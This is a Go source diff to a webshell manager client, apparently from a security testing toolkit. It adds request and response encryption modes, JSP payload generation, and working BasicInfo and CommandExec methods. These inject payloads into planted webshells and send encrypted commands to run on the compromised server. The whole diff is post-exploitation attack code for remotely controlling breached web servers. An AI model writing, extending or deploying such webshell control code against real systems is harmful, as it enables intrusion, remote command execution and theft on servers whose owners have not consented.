@@ -3,7 +3,6 @@ package wsm
 import (
 	"bytes"
 	"encoding/base64"
-	"encoding/hex"
 	"encoding/json"
 	"fmt"
 	"github.com/google/uuid"
@@ -19,44 +18,45 @@ import (
 )
 
 type YakShell struct {
-	Url         string
-	Pass        string
-	Charset     string
-	ShellScript string            //shell类型
-	CipherMode  string            //加密方式
-	Proxy       string            //代理
-	Os          string            //系统
-	IsSession   bool              //是否启用session mode
-	Retry       int64             //重试次数
-	Timeout     int64             //超时
-	BlockSize   int64             //分块大小
-	MaxSize     int64             //上传包最大（M）
-	Posts       map[string]string //在post中添加的数据
-	Headers     map[string]string //在headers中添加的数据
+	Url           string
+	Pass          string
+	Charset       string
+	ShellScript   string            //shell类型
+	ReqCipherMode string            //加密方式
+	ResCipherMode string            //返回包解密方式
+	Proxy         string            //代理
+	Os            string            //系统
+	IsSession     bool              //是否启用session mode
+	Retry         int64             //重试次数
+	Timeout       int64             //超时
+	BlockSize     int64             //分块大小
+	MaxSize       int64             //上传包最大（M）
+	Posts         map[string]string //在post中添加的数据
+	Headers       map[string]string //在headers中添加的数据
 
-	encode codecFunc            //自定义加密方式
-	decode codecFunc            //自定义解密方式
-	cache  *utils.Cache[string] //缓存cookie
+	//encode codecFunc            //自定义加密方式
+	//decode codecFunc            //自定义解密方式
+	cache *utils.Cache[string] //缓存cookie
 }
 
 func NewYakShell(shell *ypb.WebShell) (*YakShell, error) {
 	Yak := &YakShell{
-		Url:        shell.Url,
-		Pass:       shell.Pass,
-		Charset:    shell.Charset,
-		CipherMode: shell.EncMode,
-		Proxy:      shell.Proxy,
-		IsSession:  shell.ShellOptions.IsSession,
-		Retry:      shell.ShellOptions.RetryCount,
-		Timeout:    shell.ShellOptions.Timeout,
-		BlockSize:  shell.ShellOptions.BlockSize,
-		MaxSize:    shell.ShellOptions.MaxSize,
-		Posts:      make(map[string]string, 2),
-		Headers:    make(map[string]string, 2),
-		Os:         shell.Os,
-		encode:     nil,
-		decode:     nil,
-		cache:      utils.NewTTLCache[string](time.Second * 60 * 20),
+		Url:           shell.Url,
+		Pass:          shell.Pass,
+		Charset:       shell.Charset,
+		ShellScript:   shell.ShellScript,
+		ReqCipherMode: shell.EncMode,
+		ResCipherMode: shell.ResDecMOde,
+		Proxy:         shell.Proxy,
+		IsSession:     shell.ShellOptions.IsSession,
+		Retry:         shell.ShellOptions.RetryCount,
+		Timeout:       shell.ShellOptions.Timeout,
+		BlockSize:     shell.ShellOptions.BlockSize,
+		MaxSize:       shell.ShellOptions.MaxSize,
+		Posts:         make(map[string]string, 2),
+		Headers:       make(map[string]string, 2),
+		Os:            shell.Os,
+		cache:         utils.NewTTLCache[string](time.Second * 60 * 20),
 	}
 	if shell.Headers != nil {
 		Yak.Headers = shell.Headers
@@ -69,7 +69,7 @@ func NewYakShell(shell *ypb.WebShell) (*YakShell, error) {
 }
 
 func (y *YakShell) setContentType() {
-	if _, ok := y.Headers["Content-type"]; !ok {
+	if _, ok := y.Headers["Content-type"]; ok {
 		log.Infof("header has contains content-type")
 		return
 	}
@@ -92,12 +92,9 @@ func (y *YakShell) getOrCrateSession() string {
 
 // encryptAndSendPayload 加密并且发送请求
 func (y *YakShell) encryptAndSendPayload(payload []byte) ([]byte, error) {
-	encryption, err := yakshell.Encryption(payload, []byte(y.Pass), y.CipherMode)
+	encryption, err := yakshell.Encryption(payload, []byte(y.Pass), y.ReqCipherMode)
 	if err != nil {
 		return nil, err
-	}
-	if y.encode != nil {
-		//todo
 	}
 	post, err := y.post(encryption)
 	if err != nil {
@@ -116,7 +113,7 @@ func (y *YakShell) getPostConfig() []poc.PocConfigOption {
 	config = append(config, poc.WithTimeout(float64(y.Timeout)))
 	//todo: 应该增加重试次数
 	config = append(config, poc.WithRetryTimes(int(y.Retry)))
-	config = append(config, poc.WithRetryInStatusCode(200, 404, 403, 502, 503, 500))
+	config = append(config, poc.WithRetryInStatusCode(404, 403, 502, 503, 500))
 	if y.IsSession {
 		config = append(config, poc.WithSession(y.getOrCrateSession()))
 	}
@@ -141,13 +138,15 @@ func (y *YakShell) post(data []byte) ([]byte, error) {
 func (y *YakShell) injectPayload() error {
 	var data []byte
 	var err error
+	var tmpMap = make(map[string]string, 2)
+	y.processParams(tmpMap)
 	switch y.ShellScript {
 	case ypb.ShellScript_PHP.String():
 		fallthrough
 	case ypb.ShellScript_ASPX.String():
 		fallthrough
 	case ypb.ShellScript_JSP.String():
-		data, err = hex.DecodeString(payloads.YakShellPayload[y.ShellScript][payloads.AllPayload])
+		data, err = y.getPayload(payloads.AllPayload, tmpMap)
 	default:
 		log.Errorf("webshell类型错误")
 		return utils.Errorf("not found this script")
@@ -173,6 +172,7 @@ func (y *YakShell) getPayload(binCode payloads.Payload, params map[string]string
 	var partAddPayload []byte
 	var err error
 	var hexCode string
+	y.processParams(params)
 	if y.IsSession {
 		//如果是session就每次都获取到AllPayload去做解析
 		hexCode = payloads.YakShellPayload[y.ShellScript][payloads.AllPayload]
@@ -183,7 +183,7 @@ func (y *YakShell) getPayload(binCode payloads.Payload, params map[string]string
 	case ypb.ShellScript_PHP.String():
 		rawPayload, partAddPayload, err = behinder.GetRawPHP(hexCode, params)
 	case ypb.ShellScript_JSP.String():
-		//todo
+		rawPayload, err = behinder.GetRawClass(hexCode, params)
 	case ypb.ShellScript_ASPX.String():
 		//todo
 	}
@@ -207,10 +207,10 @@ func (y *YakShell) ServerResponseDecode(raw []byte) ([]byte, error) {
 }
 
 func (y *YakShell) handleResponse(data []byte) ([]byte, error) {
-	if y.decode != nil {
-		//	todo
-	}
-	decryption, err := yakshell.Decryption(data, []byte(y.Pass), y.CipherMode)
+	//if y.decode != nil {
+	//	//	todo
+	//}
+	decryption, err := yakshell.Decryption(data, []byte(y.Pass), y.ResCipherMode)
 	if err != nil {
 		return nil, err
 	}
@@ -222,7 +222,7 @@ func (y *YakShell) handleResponse(data []byte) ([]byte, error) {
 	if decodedMap, ok := raw.(map[string]interface{}); ok {
 		if status, exists := decodedMap["status"]; exists {
 			if status != "ok" {
-				return nil, utils.Error("status error")
+				return nil, utils.Errorf("execute fail: %v", decodedMap["msg"])
 			}
 		} else {
 			return nil, utils.Error("status field not found in the JSON data")
@@ -244,11 +244,11 @@ func (y *YakShell) SetPacketScriptContent(content string) {
 }
 
 func (y *YakShell) EchoResultEncodeFormYak(raw []byte) ([]byte, error) {
-	return yakshell.Encryption(raw, []byte(y.Pass), y.CipherMode)
+	return yakshell.Encryption(raw, []byte(y.Pass), y.ReqCipherMode)
 }
 
 func (y *YakShell) EchoResultDecodeFormYak(raw []byte) ([]byte, error) {
-	return yakshell.Decryption(raw, []byte(y.Pass), y.CipherMode)
+	return yakshell.Decryption(raw, []byte(y.Pass), y.ReqCipherMode)
 }
 
 func (y *YakShell) SetPayloadScriptContent(content string) {
@@ -256,17 +256,20 @@ func (y *YakShell) SetPayloadScriptContent(content string) {
 }
 
 func (y *YakShell) processParams(params map[string]string) {
-	value, _ := y.EchoResultEncodeFormYak([]byte(""))
-	if len(value) != 0 {
-		switch y.ShellScript {
-		case ypb.ShellScript_ASPX.String():
-			// todo
-			params["decoderAssemblyBase64"] = string(value)
-		case ypb.ShellScript_JSP.String(), ypb.ShellScript_JSPX.String():
-			params["customEncoderFromClass"] = string(value)
-		case ypb.ShellScript_PHP.String(), ypb.ShellScript_ASP.String():
-			params["customEncoderFromText"] = string(value)
-		}
+	params["pass"] = y.Pass
+	value, ok := payloads.EncryptPayload[y.ShellScript][y.ResCipherMode]
+	if !ok {
+		//log.Warn("not found response decode mode")
+		return
+	}
+	switch y.ShellScript {
+	case ypb.ShellScript_ASPX.String():
+		// todo
+		params["decoderAssemblyBase64"] = base64.StdEncoding.EncodeToString([]byte(value))
+	case ypb.ShellScript_JSP.String(), ypb.ShellScript_JSPX.String():
+		params["customEncoderFromClass"] = base64.StdEncoding.EncodeToString([]byte(value))
+	case ypb.ShellScript_PHP.String(), ypb.ShellScript_ASP.String():
+		params["customEncoderFromText"] = value
 	}
 	if y.ShellScript == ypb.ShellScript_JSP.String() || y.ShellScript == ypb.ShellScript_JSPX.String() {
 		for key, value := range params {
@@ -294,13 +297,28 @@ func (y *YakShell) Ping(opts ...behinder.ExecParamsConfig) (bool, error) {
 }
 
 func (y *YakShell) BasicInfo(opts ...behinder.ExecParamsConfig) ([]byte, error) {
-	//TODO implement me
-	panic("implement me")
+	if err := y.InjectPayloadIfNoCookie(); err != nil {
+		return nil, err
+	}
+	payload, err := y.getPayload(payloads.BasicInfoGo, map[string]string{})
+	if err != nil {
+		return nil, err
+	}
+	return y.encryptAndSendPayload(payload)
+	//panic("implement me")
 }
 
 func (y *YakShell) CommandExec(cmd string, opts ...behinder.ExecParamsConfig) ([]byte, error) {
-	//TODO implement me
-	panic("implement me")
+	if err := y.InjectPayloadIfNoCookie(); err != nil {
+		return nil, err
+	}
+	payload, err := y.getPayload(payloads.CmdGo, map[string]string{
+		"command": cmd,
+	})
+	if err != nil {
+		return nil, err
+	}
+	return y.encryptAndSendPayload(payload)
 }
 
 func (y *YakShell) String() string {
